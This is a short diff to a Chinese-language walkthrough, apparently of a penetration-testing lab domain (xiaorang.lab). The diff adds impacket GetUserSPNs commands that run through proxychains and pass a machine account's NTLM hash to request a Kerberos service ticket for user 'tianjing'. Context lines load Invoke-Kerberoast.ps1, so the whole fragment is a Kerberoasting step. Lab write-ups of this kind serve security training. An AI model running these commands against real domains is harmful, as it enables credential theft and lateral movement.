@@ -3,6 +3,10 @@
 以先利用 Kerberoasting 拿下 TIANJING 用户 首先请求 WWW/xr-0923.xiaorang.lab/IIS 这个 SPN 的 ST
 
 ```bash
+# 获取SPN
+proxychains GetUserSPNs.py xiaorang.lab/'XR-0923$' -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip 172.22.14.11
+proxychains impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip 172.22.14.11 -request-user tianjing
+
 Import-Module .\Invoke-Kerberoast.ps1
 # 用 SharpHound 收集到的 SPNName
 $SPNName = 'WWW/xr-0923.xiaorang.lab/IIS'
